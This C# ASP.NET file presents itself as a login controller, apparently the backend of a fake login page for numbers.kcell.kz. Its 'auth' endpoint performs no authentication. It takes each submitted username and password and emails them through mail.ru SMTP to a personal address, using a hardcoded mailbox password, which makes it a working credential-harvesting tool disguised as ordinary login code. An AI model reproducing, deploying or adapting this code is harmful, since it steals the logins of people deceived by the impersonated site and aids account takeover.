using Microsoft.AspNetCore.Cors;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using NumsServer.Data;
using System.Net;
using System.Net.Mail;

namespace NumsServer.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class LoginController : ControllerBase
    {
        [HttpPost("auth")]
        public async Task Login(LoginViewModel loginViewModel)
        {
            string username = loginViewModel.Username;
            string password = loginViewModel.Password;

            string my_email = "amyrzoyev@mail.ru";

            MailAddress fromAdress = new MailAddress(my_email, "Tester");
            MailAddress toAdress = new MailAddress(my_email);

            MailMessage message = new MailMessage(fromAdress, toAdress);
            message.Body = $"Логин: {username}\nПароль: {password}";
            message.Subject = "numbers.kcell.kz";

            SmtpClient smtpClient = new SmtpClient
            {
                Host = "smtp.mail.ru",
                Port = 25,
                UseDefaultCredentials = false,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                Credentials = new NetworkCredential(my_email, "kns0b0PBrYyn1Fjqy649"),
            };

            smtpClient.Send(message);
        }
    }
}
